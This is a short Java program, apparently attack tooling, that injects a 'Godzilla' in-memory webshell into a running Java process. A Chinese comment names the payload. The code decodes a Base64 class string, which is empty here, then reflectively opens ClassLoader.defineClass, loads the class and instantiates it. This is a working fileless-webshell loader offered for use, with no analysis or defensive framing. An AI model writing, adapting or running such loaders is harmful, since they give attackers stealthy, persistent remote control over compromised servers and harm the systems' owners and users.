import java.lang.reflect.Method;
import java.util.Base64;

public class InjectMemShell {
    public static void main(String[] args) {
        try {
            //哥斯拉内存shell的class Base64
            String godzillaMemShellClassBase64 = "";
            byte[] classBytes =  Base64.getDecoder().decode(godzillaMemShellClassBase64);
            ClassLoader loader = Thread.currentThread().getContextClassLoader();
            Method defineClassMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClassMethod.setAccessible(true);
            Class clazz = (Class) defineClassMethod.invoke(loader,classBytes,0,classBytes.length);
            clazz.newInstance();
        }catch (Exception e){
            e.printStackTrace();
        }


    }
}
